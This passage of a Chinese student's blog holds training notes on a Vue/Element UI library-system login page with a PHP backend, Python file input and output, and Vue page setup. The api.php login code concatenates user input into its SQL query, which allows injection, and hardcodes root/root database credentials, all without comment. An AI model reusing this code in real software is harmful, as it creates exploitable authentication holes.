class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./index.css&quot;&gt;</span><br><span class="line">    &lt;script src=&quot;./vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;login1&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;login2&quot;&gt;</span><br><span class="line">                &lt;i class=&quot;el-icon-reading&quot;&gt;&lt;/i&gt;</span><br><span class="line">                &lt;h1&gt;图书管理系统登录&lt;/h1&gt;</span><br><span class="line">                &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.username&quot; clearable&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;el-input placeholder=&quot;请输入内容&quot; v-model=&quot;userData.password&quot; clearable show-password&gt;&lt;/el-input&gt;</span><br><span class="line">                &lt;el-button type=&quot;primary&quot; @click=&quot;login&quot;&gt;登录&lt;/el-button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .el-icon-reading &#123;</span><br><span class="line">            font-size: 100px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 20vh;</span><br><span class="line">            width: 20vw;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        .login1 &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            flex-direction: column;</span><br><span class="line">            align-items: center;</span><br><span class="line">            background-image: url(./img/6.jpg);</span><br><span class="line">            background-repeat: no-repeat;</span><br><span class="line">            background-size: 100% 100%;</span><br><span class="line">            background-attachment: fixed;</span><br><span class="line">            width: 100vw;</span><br><span class="line">            height: 100vh;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;script src=&quot;./axios.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;./index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        new Vue(&#123;</span><br><span class="line">            el: &#x27;#app&#x27;,</span><br><span class="line">            data: function() &#123;</span><br><span class="line">                return &#123;</span><br><span class="line">                    visible: false,</span><br><span class="line">                    userData: &#123;</span><br><span class="line">                        username: &#x27;&#x27;,</span><br><span class="line">                        password: &#x27;&#x27;,</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods: &#123;</span><br><span class="line">                login: function() &#123;</span><br><span class="line">                    axios.post(&#x27;http://192.168.17.128/api.php&#x27;, this.userData)</span><br><span class="line">                        .then((response) =&gt; &#123;</span><br><span class="line">                                console.log(response);</span><br><span class="line">                                if (response.data.includes(&#x27;success&#x27;)) &#123;</span><br><span class="line">                                    window.location.href = &quot;http://192.168.17.128/zhuye.php&quot;;</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                    this.open4();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                        )</span><br><span class="line">                &#125;,</span><br><span class="line">                open4: function() &#123;</span><br><span class="line">                    this.$notify.error(&#123;</span><br><span class="line">                        title: &#x27;错误&#x27;,</span><br><span class="line">                        message: &#x27;账号密码错误&#x27;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>（2）45到78行使用了axios和数据绑定，我们来进行分析。代码创建了一个Vue实例并绑定到id为”app”的元素上。在data选项中定义了一些数据属性，包括visible、userData和其中的username和password属性。<br>在methods选项中定义了一个名为login的方法。该方法使用Axios发送一个POST请求到”<a target="_blank" rel="noopener" href="http://192.168.17.128/api.php%22%EF%BC%8C%E5%B9%B6%E4%BC%A0%E9%80%92userData%E4%BD%9C%E4%B8%BA%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8F%82%E6%95%B0%E3%80%82%E8%AF%B7%E6%B1%82%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E9%80%9A%E8%BF%87%E5%88%A4%E6%96%AD%E8%BF%94%E5%9B%9E%E7%9A%84%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%E4%B8%AD%E6%98%AF%E5%90%A6%E5%8C%85%E5%90%AB%22success%22%E6%9D%A5%E7%A1%AE%E5%AE%9A%E7%99%BB%E5%BD%95%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E3%80%82%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%B0%86%E8%B7%B3%E8%BD%AC%E5%88%B0%22http://192.168.2.70/zhuye.php%22%EF%BC%9B%E5%A6%82%E6%9E%9C%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%B0%86%E8%B0%83%E7%94%A8open4%E6%96%B9%E6%B3%95%E3%80%82">http://192.168.17.128/api.php&quot;，并传递userData作为请求的参数。请求成功后，通过判断返回的响应数据中是否包含&quot;success&quot;来确定登录是否成功。如果成功，代码将跳转到&quot;http://192.168.2.70/zhuye.php&quot;；如果失败，将调用open4方法。</a><br>open4方法使用了Vue的$notify方法来显示一个错误通知，通知的标题是”错误”，内容是”账号密码错误”。</p>
<h2 id="api-php的使用"><a href="#api-php的使用" class="headerlink" title="api.php的使用"></a>api.php的使用</h2><p>1.编写api.php,写入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: *&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE&quot;);</span><br><span class="line">header(&quot;Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With&quot;);</span><br><span class="line">$link = mysqli_connect(&quot;192.168.17.128&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(json_encode([&#x27;error&#x27; =&gt; &#x27;数据库连接失败！&#x27;]));</span><br><span class="line">mysqli_query($link, &quot;set names utf8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$requertPath = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">$requestMethod = $_SERVER[&#x27;REQUEST_METHOD&#x27;];</span><br><span class="line">if ($requertPath === &#x27;/api.php&#x27; &amp;&amp; $requestMethod === &#x27;POST&#x27;) &#123;</span><br><span class="line">    $inputJSON = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">    $input = json_decode($inputJSON, true);</span><br><span class="line">    if ($input === null) &#123;</span><br><span class="line">        header(&#x27;HTTP/1.1 400 Bad Request&#x27;);</span><br><span class="line">        echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line"></span><br><span class="line">        $username = $input[&#x27;username&#x27;];</span><br><span class="line">        $password = $input[&#x27;password&#x27;];</span><br><span class="line">        $sql = &quot;SELECT username, password FROM users WHERE username=&#x27;$username&#x27; and  password=&#x27;$password&#x27;LIMIT 0,1&quot;;</span><br><span class="line">        $result = mysqli_query($link, $sql);</span><br><span class="line">        if (mysqli_num_rows($result) &gt; 0) &#123;</span><br><span class="line">            echo &#x27;success&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &#x27;账号和密码错误&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&#x27;http/1.1 400 Bad Request&#x27;);</span><br><span class="line">    echo json_encode([&#x27;error&#x27; =&gt; &#x27;Invalid JSON&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们对这段代码进行分析：<br>（1）首先通过设置HTTP头部信息，允许跨域请求，这在前后端分离的项目中是非常常见的。<br>（2）使用mysqli_connect函数连接到MySQL数据库服务器，并选择名为”security”的数据库。如果连接失败，则会返回一个包含错误信息的JSON响应并退出程序。<br>（3）根据接收到的HTTP请求的路径和方法，判断是否为预期的接口路径和请求类型。如果是预期的POST请求，就从请求中获取JSON格式的数据，并解析为关联数组。<br>（4）如果解析JSON数据出错，返回400 Bad Request响应；否则，从接收到的数据中获取用户名和密码，并构造一个SQL查询语句，查询名为”users”的表中是否存在对应的用户名和密码记录。<br>（5）如果查询结果存在匹配的用户名和密码，则返回”success”字符串，表示登录成功；否则，返回”账号和密码错误”字符串，表示登录失败。在未收到预期的路径和请求方法时，同样返回400 Bad Request响应。<br>2.把index.php和api.php复制到虚拟机win10hei的phpstudy的根目录下，打开网站，点击登录，可以跳转到主页页面。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340415039-2ff8e0a3-feb0-42c9-9f62-564858825c25.png" alt="图片2.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1703340431465-a425e375-7478-4140-9748-ce946165134a.png" alt="图片1.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记18" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B018/" class="article-date">
      <time datetime="2023-12-17T02:15:13.000Z" itemprop="datePublished">2023-12-17</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B018/">文件操作</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>1.找到这个文件，双击打开它<br>open(文件路径，mode&#x3D;””,encoding&#x3D;””)<br>mode:打开这个文件的目的是什么,分为读和写<br>pycharm里面创建的文件默认是UTF-8<br>文件路径:<br>      绝对路径:<br>      d:&#x2F;test1&#x2F;XXX.txt #这种路径不安全,可能不存在<br>      相对路径:相对你当前的程序而言你要找的文件在哪(相对于当前你的程序所在的文件夹)<br>       ..&#x2F;    表示上一次文件夹<br>mode:<br>       r  read(读取)</p>
<h2 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h2><p>用open打开文件路径不报错就说明打开成功，找文件一定要找到相对应的路径<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702217700254-8328f029-68c3-465c-bc0e-d02ca676bcd2.png" alt="image.png"><br>你代表你的程序，文代表文件，f相当于一个管道，mode决定了方向因为是读取，所以市场文件的方向出发到你的程序终止，为什么open的时候没有把整个文件全部加载到内存呢？因为对于该文件是没办法判断大小的<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702218263980-b15f1ba9-2a4f-4c0c-a5f5-317749359102.png" alt="image.png"><br>这里直接print(f.read()),直接输出资源.txt里面的内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702218546907-3107eb95-9281-49ae-960b-04bd26f2131e.png" alt="image.png"><br>centent&#x3D;f.read()#全部读取<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702218655474-82e96e1d-a098-444d-be86-c16f4d077c86.png" alt="image.png"><br>经过自我摸索write写的方法已经实践出来了<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702219051979-35544fe0-07a7-493b-90f7-dc1b65e753c8.png" alt="image.png"><br>结果如下：<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702219132293-3afe7d03-7421-4ede-aab8-f35ef2ba20a2.png" alt="image.png"><br>readline这是一行一行的读取文本的内容，可以接着读取<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702219680159-f75e51b4-85de-4473-8f6c-f905e62a00f1.png" alt="image.png"></p>
<p> strip可以消除字符串左右两端的空白。空格，换行符，制表符<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702220134813-08bb9ebd-33a7-4172-b849-aa1148c7af41.png" alt="image.png"><br>那用什么方法可以看到换行符呢？用readlines进行查看，此时输出的是一个数组<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702220321397-db7e971a-9b62-4873-b94e-3216c69828a1.png" alt="image.png"><br>readlines和f.read()都无法解决文件太大的问题，所以readline更加重要<br> 最重要的文本读取方式(必须掌握)<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702220963610-9e1168c4-7b60-42ab-b4a0-00cf92e16bfb.png" alt="image.png"></p>
<h2 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h2><p>w:write(写入)，write可以创建在该文件路径没有的文件，例如，下面美女.txt是不存在的，当我输入这一段之后进行的是创建了这个美女.txt。<br>w模式下，如果文件不存在就会自动的创建一个文件。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702550796040-be9eee5e-b285-4355-b48d-014538361ad4.png" alt="image.png"><br>在美女txt中随便输入一些内容<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551391134-95e9295e-48eb-4a81-be3b-f2303797e329.png" alt="image.png"><br>再次运行发现文件清空:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551453613-aaca6a19-a80f-4dcb-a741-c3cc1e56fc8c.png" alt="image.png"><br>写入一个嘎嘎威在这个美女.txt中<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551546591-f918d816-f29a-410f-b481-662f52388df9.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1702551609744-3830891f-5f59-45cb-b2b0-9f36553be65d.png#averageHue=%23f6f5f0&clientId=ua058a9ba-9a99-4&from=paste&height=81&id=u87f610f0&originHeight=101&originWidth=427&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5816&status=done&style=none&taskId=ud0cab006-6f78-4684-8344-4fa374a4990&title=&width=341.6" alt="image.png"><br>写入之后记得进行close<br>左边是文件,右边是程序,进行调用插根管子.<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551717668-6f95d2e9-643c-416e-895c-15cccb4479a8.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702551867898-ff54fa1c-b511-48cd-a11c-e85275fa672c.png" alt="image.png"><br>案例:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702552518330-45a7735e-e71b-4333-ae54-2fe599cdebf5.png" alt="image.png"><br>可是发现一个问题就是写入之后数据是连在一起的<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702552624853-805f2b12-2aba-415c-85b4-10887c82a6d9.png" alt="image.png"><br>这需要进行换行,可以直接在lst[0]+”\n”:<br>也可以直接去在每一次输出的后面加上f.write(“\n”),也可以实现换行的效果.<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702552921079-b9d3a9cd-d343-41e5-b8cf-945426bb67f5.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553033397-3fc0dccc-16c9-4d55-a208-e3b9bb32c795.png" alt="image.png"><br>这个只是单个数据的输出,如果是多个数据那咋办?所以此时就需要用到for循环<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553277094-aea390e6-0c2f-4b6a-a413-d038e4b4b2d5.png" alt="image.png"><br>如果把f&#x3D;open(file&#x3D;”美女.txt”,mode&#x3D;”w”,encoding&#x3D;”utf-8”)放入到循环体中发现永远都是处于清空状态,只有最后一个数据写入时才有效果.此时发现只有赵敏和?.<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553441903-05bdd68b-6b5c-43dc-aeec-d1837eca2c3d.png" alt="image.png"><br>将管道放在循环体外就可以正常写入</p>
<p>接着就是a模式:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553834877-6bb769e3-f4c8-4695-aace-3e66a98b4a66.png" alt="image.png"><br>此时输出结果为:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553885806-82a1d9c3-34f8-4324-a0c0-129753cbb89a.png" alt="image.png"><br>整个笔记为:<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553980783-8b82e9c8-a93b-415f-9cb0-393152fd7946.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记17" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B017/" class="article-date">
      <time datetime="2023-12-17T01:16:31.000Z" itemprop="datePublished">2023-12-17</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B017/">用vue2写网页</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="一-引入按钮"><a href="#一-引入按钮" class="headerlink" title="一.引入按钮"></a>一.引入按钮</h2><p>1.访问element  zn-cn官网，链接：<a target="_blank" rel="noopener" href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a>   引入样式和组件库<br>2.在左侧的菜单栏的安装，复制以下代码，在vscode中新建index.php文件，粘贴到index.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;app&quot;&gt;                              //3,4行是body中的内容</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- import Vue before Element --&gt;</span><br><span class="line"> &lt;script src=&quot;https://unpkg.com/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;!-- import JavaScript --&gt;</span><br><span class="line"> &lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line">   new Vue(&#123;</span><br><span class="line">     el: &#x27;#app&#x27;,</span><br><span class="line">     data: function() &#123;</span><br><span class="line">       return &#123; visible: false &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>3.在左侧的菜单栏找到button按钮，复制一个蓝色按钮的代码，粘贴到<div id="app"> </div>中。复制以下三个链接在浏览器打开，然后复制代码，新建index.css  vue.js    index.js，把代码对应粘贴到这三个文件，引入样式和组件库 。<br>1.<a target="_blank" rel="noopener" href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">https://unpkg.com/element-ui/lib/theme-chalk/index.css</a><br>2.<a target="_blank" rel="noopener" href="https://unpkg.com/vue@2/dist/vue.js">https:&#x2F;&#x2F;unpkg.com&#x2F;vue@2&#x2F;dist&#x2F;vue.js</a><br>3.<a target="_blank" rel="noopener" href="https://unpkg.com/element-ui/lib/index.js">https://unpkg.com/element-ui/lib/index.js</a><br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553518275-0506f334-7b1c-4fb0-8bce-e36dca6be611.png" alt="image.png"><br>4.右击index.php,在文件管理器中显示，复制上图四个文件，粘贴到虚拟机win10hei的PHPstudy的根目录下，ctrl+s保存，在phpstudy中打开网站，出现按钮。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553812206-166b195f-d1d8-4e62-9cf8-8cddb5e9cc12.png" alt="image.png"></p>
<h2 id="二-制作网页"><a href="#二-制作网页" class="headerlink" title="二.制作网页"></a>二.制作网页</h2><p>1.仿照老师发的网页图，制作一个图书管理系统<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702553970138-a22c4747-e55a-4f5c-8dbb-fb1abb7a3447.png" alt="b93486f7a701fa3193a7a784f352c91.png"><br>2.因为还在编写网页，还未上传结果图</p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702777105558-f4839df8-c2f9-46bc-a72a-8d0e2f846fdc.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702777169175-db788011-ec0b-4d59-9ee6-924fdb4b3491.png" alt="image.png"></p>
<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702777313628-c3d7544e-fcf2-4e66-9ba6-fc9d108fa1c2.png" alt="image.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-培训笔记16" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B016/" class="article-date">
      <time datetime="2023-12-17T01:13:41.000Z" itemprop="datePublished">2023-12-17</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/12/17/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B016/">用vue写网页</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="一-引入Element按钮，Container布局容器，菜单侧边栏"><a href="#一-引入Element按钮，Container布局容器，菜单侧边栏" class="headerlink" title="一.引入Element按钮，Container布局容器，菜单侧边栏"></a>一.引入Element按钮，Container布局容器，菜单侧边栏</h2><p>1.简单回顾vue的安装和创建项目。<br>2.访问Element官网。   链接：<a target="_blank" rel="noopener" href="https://element-plus.org/zh-CN/component/button.html">https://element-plus.org/zh-CN/component/button.html</a>  选择红色按钮，<br>复制红色按钮的代码到vscode的app.vue文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ElButton &#125; from &#x27;element-plus&#x27;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;el-button type=&quot;info&quot;&gt;Danger&lt;/el-button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>

<p>3.发现红色按钮位置是在正中间，是错误的。后来经过老师的提示，要把main.js文件中下列居中代码删掉。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702477935327-f9d694eb-44fc-46d6-8140-63ab3670947e.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#x27;./assets/main.css&#x27;</span><br></pre></td></tr></table></figure>

<p>4.找到要用到的布局，先查看它的代码，再复制到app.vue。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702477982134-682e8b51-64a8-4a95-9d30-9f950184080b.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;common-layout&quot;&gt;</span><br><span class="line">   &lt;el-container&gt;</span><br><span class="line">     &lt;el-aside width=&quot;200px&quot;&gt;Aside&lt;/el-aside&gt;</span><br><span class="line">     &lt;el-container&gt;</span><br><span class="line">       &lt;el-header&gt;Header&lt;/el-header&gt;</span><br><span class="line">       &lt;el-main&gt;Main&lt;/el-main&gt;</span><br><span class="line">     &lt;/el-container&gt;</span><br><span class="line">   &lt;/el-container&gt;</span><br><span class="line"> &lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>5.找到要用到的菜单侧边栏，先查看它的代码，再复制到app.vue。<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1702478014643-2c19b422-9987-4c66-a26b-05ed460f4661.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 